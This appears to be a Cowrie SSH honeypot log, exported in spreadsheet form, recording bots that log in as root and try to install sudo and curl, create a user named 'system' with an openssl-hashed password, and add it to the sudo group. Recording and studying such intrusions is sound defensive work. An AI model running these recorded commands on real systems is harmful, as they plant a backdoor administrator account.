2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] CM	D:	op	enssl passwd -1 XQ7v7fHq
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Ca	n'	t f	ind command openssl
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Co	mm	and	not found: openssl passwd -1 XQ7v7fHq
2023-11-28T17:00:44+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-28T17:00:44+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
2023-11-28T17:00:44+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Ca	n'	t f	ind command apt
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Co	mm	and	not found: apt update
2023-11-28T17:00:44+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Ca	n'	t f	ind command apt
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Co	mm	and	not found: apt install sudo curl -y
2023-11-28T17:00:44+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Co	mm	and	found: sudo useradd -m -p  system
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Co	mm	and	found: sudo usermod -aG sudo system
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Ca	n'	t f	ind command usermod
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Ca	n'	t f	ind command -aG
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Co	mm	and	found: sudo usermod -aG sudo system
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Ca	n'	t f	ind command usermod
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Ca	n'	t f	ind command -aG
2023-11-28T17:00:44+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,10,170.64.136.235] Ca	n'	t f	ind command system
2023-11-28T17:00:44+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-28T17:00:45+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] remote close			
2023-11-28T17:00:45+0000	[HoneyPotSSHTransport,10,170.64.136.235] Closing TTY Log: var/lib/cowrie/tty/695fd840e7d869011a64ca6a	fc	89	c79419b55f86eac796c68d58dd332b9366b after 0 seconds
2023-11-28T17:00:45+0000	[HoneyPotSSHTransport,10,170.64.136.235] avatar root logging out			
2023-11-28T17:00:45+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
2023-11-28T17:00:45+0000	[HoneyPotSSHTransport,10,170.64.136.235] Connection lost after 5 seconds			
2023-11-28T17:32:02+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
2023-11-28T17:32:02+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
2023-11-28T17:32:02+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 170.64.166.122:40008 (172.17.0.2:2222) [session	:	236	a89ab034a]
2023-11-28T17:32:02+0000	[HoneyPotSSHTransport,11,170.64.166.122] Remote SSH version: SSH-2.0-Go			
2023-11-28T17:32:02+0000	[HoneyPotSSHTransport,11,170.64.166.122] SSH client hassh fingerprint: 4e066189c3bbeec38c99b185511373	3a		
2023-11-28T17:32:02+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
2023-11-28T17:32:02+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-28T17:32:02+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-28T17:32:02+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
2023-11-28T17:32:02+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-11-28T17:32:03+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'			
2023-11-28T17:32:03+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
2023-11-28T17:32:03+0000	[HoneyPotSSHTransport,11,170.64.166.122] Could not read etc/userdb.txt, default database activated			
2023-11-28T17:32:03+0000	[HoneyPotSSHTransport,11,170.64.166.122] login attempt [b'root'/b'0'] succeeded			
2023-11-28T17:32:03+0000	[HoneyPotSSHTransport,11,170.64.166.122] Initialized emulated server as architecture: linux-x64-lsb			
2023-11-28T17:32:03+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'			
2023-11-28T17:32:03+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'			
2023-11-28T17:32:03+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
2023-11-28T17:32:03+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
2023-11-28T17:32:03+0000	"[twisted.conch.ssh.session#info] Executing command ""b'apt update && apt install sudo curl -y && sudo"	us	era	"dd -m -p $(openssl passwd -1 P323Yu95) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system'"""
2023-11-28T17:32:03+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,11,170.64.166.122] CM	D:	ap	t update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 P323Yu95) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
2023-11-28T17:32:03+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,11,170.64.166.122] CM	D:	op	enssl passwd -1 P323Yu95
2023-11-28T17:32:03+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,11,170.64.166.122] Ca	n'	t f	ind command openssl
2023-11-28T17:32:03+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,11,170.64.166.122] Co	mm	and	not found: openssl passwd -1 P323Yu95
2023-11-28T17:32:03+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-28T17:32:03+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
2023-11-28T17:32:03+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
